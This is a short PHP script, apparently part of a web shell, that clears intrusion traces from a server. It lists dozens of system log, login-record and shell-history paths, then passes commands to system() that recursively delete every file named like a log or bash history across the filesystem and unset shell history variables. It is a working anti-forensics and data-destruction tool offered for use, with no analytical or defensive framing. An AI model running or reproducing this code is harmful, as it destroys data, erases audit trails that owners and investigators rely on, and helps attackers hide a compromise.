<?php
$paths = array("/var/log/lastlog", "/var/log/telnetd", "/var/run/utmp", "/var/log/secure", "/root/.ksh_history", "/root/.bash_history", "/root/.bash_logut", "/var/log/wtmp", "/etc/wtmp", "/var/run/utmp", "/etc/utmp", "/var/log", "/var/adm", "/var/apache/log", "/var/apache/logs", "/usr/local/apache/logs", "/usr/local/apache/logs", "/var/log/acct", "/var/log/xferlog", "/var/log/messages/", "/var/log/proftpd/xferlog.legacy", "/var/log/proftpd.xferlog", "/var/log/proftpd.access_log", "/var/log/httpd/error_log", "/var/log/httpsd/ssl_log", "/var/log/httpsd/ssl.access_log", "/etc/mail/access", "/var/log/qmail", "/var/log/smtpd", "/var/log/samba", "/var/log/samba.log.%m", "/var/lock/samba", "/root/.Xauthority", "/var/log/poplog", "/var/log/news.all", "/var/log/spooler", "/var/log/news", "/var/log/news/news", "/var/log/news/news.all", "/var/log/news/news.crit", "/var/log/news/news.err", "/var/log/news/news.notice", "/var/log/news/suck.err", "/var/log/news/suck.notice", "/var/spool/tmp", "/var/spool/errors", "/var/spool/logs", "/var/spool/locks", "/usr/local/www/logs/thttpd_log", "/var/log/thttpd_log", "/var/log/ncftpd/misclog.txt", "/var/log/nctfpd.errs", "/var/log/auth");
echo "<br><br><center><h2>OutPut</h2></center>";
$comandos = array('find / -name *.bash_history -exec rm -rf {} \;', 'find / -name *.bash_logout -exec rm -rf {} \;', 'find / -name log* -exec rm -rf {} \;', 'find / -name  *.log -exec rm -rf {} \;', 'unset HISTFILE', 'unset SAVEHIST');
echo "<center>";
        
echo "<br><br>";
foreach($comandos as $comando) {
    echo "<b>Loading command : </b>" . $comando . "<br>";
    system($comando);
}
echo "<center>";
?>